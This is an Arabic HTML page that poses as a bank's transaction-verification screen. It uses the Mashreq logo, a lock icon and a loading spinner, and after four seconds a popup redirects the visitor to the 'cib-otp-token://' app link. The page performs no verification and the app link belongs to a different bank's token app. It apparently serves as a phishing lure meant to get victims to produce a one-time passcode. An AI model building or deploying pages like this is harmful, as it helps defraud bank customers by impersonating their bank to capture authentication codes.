<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>جاري التحقق</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: #f5f5f5;
  text-align: center;
}

/* Container */
.container {
  padding: 30px 20px;
}

/* Logo */
.logo {
  margin-top: 20px;
}

.logo img {
  width: 120px;
}

/* Shield */
.icon-circle {
  width: 90px;
  height: 90px;
  border: 2px solid #f97316;
  border-radius: 50%;
  margin: 40px auto;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #f97316;
  font-size: 30px;
}

/* Text */
.title {
  font-size: 20px;
  font-weight: bold;
}

.subtitle {
  color: #777;
  margin-top: 10px;
}

/* Loader box */
.loader-box {
  margin-top: 30px;
  padding: 15px;
  border: 1px solid #f97316;
  border-radius: 12px;
  display: inline-flex;
  align-items: center;
  gap: 10px;
  color: #f97316;
}

/* Spinner */
.spinner {
  width: 20px;
  height: 20px;
  border: 3px solid #f97316;
  border-top: 3px solid transparent;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  100% { transform: rotate(360deg); }
}

/* Footer */
.footer {
  position: fixed;
  bottom: 0;
  width: 100%;
}

.footer-top {
  background: #0b4d8c;
  color: white;
  padding: 10px;
}

.footer-bottom {
  background: #f97316;
  color: white;
  padding: 10px;
}

/* Modal */
.modal {
  display: none;
  position: fixed;
  top:0;
  left:0;
  width:100%;
  height:100%;
  background: rgba(0,0,0,0.5);
  justify-content:center;
  align-items:center;
}

.modal-box {
  background:white;
  padding:20px;
  border-radius:16px;
  width:90%;
  max-width:320px;
}

button {
  width:100%;
  padding:12px;
  border:none;
  border-radius:10px;
  margin-top:10px;
}

.btn-main {
  background:#f97316;
  color:white;
}

.btn-cancel {
  background:#eee;
}
</style>

</head>

<body>

<div class="container">

  <!-- Logo -->
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/Mashreq_logo.svg/512px-Mashreq_logo.svg.png">
  </div>

  <!-- Icon -->
  <div class="icon-circle">🔒</div>

  <!-- Text -->
  <div class="title">جاري التحقق من العملية</div>
  <div class="subtitle">يرجى الانتظار قليلاً بينما يتم التحقق</div>

  <!-- Loader -->
  <div class="loader-box">
    <div class="spinner"></div>
    جاري المعالجة
  </div>

</div>

<!-- Footer -->
<div class="footer">
  <div class="footer-top">📞 تحتاج إلى مساعدة؟</div>
  <div class="footer-bottom">أماكن الفروع وماكينات</div>
</div>

<!-- Modal -->
<div id="modal" class="modal">
  <div class="modal-box">
    <h3>فتح تطبيق التوكن</h3>
    <p>سيتم تحويلك لإكمال التحقق</p>

    <button class="btn-main" onclick="openApp()">حسناً</button>
    <button class="btn-cancel" onclick="closeModal()">إلغاء</button>
  </div>
</div>

<script>

// بعد 4 ثواني يظهر Popup
setTimeout(() => {
  document.getElementById("modal").style.display = "flex";
}, 4000);

// فتح التطبيق
function openApp() {
  localStorage.setItem("openedApp", "true");
  window.location.href = "cib-otp-token://";
}

// إغلاق
function closeModal() {
  document.getElementById("modal").style.display = "none";
}

</script>

</body>
</html>
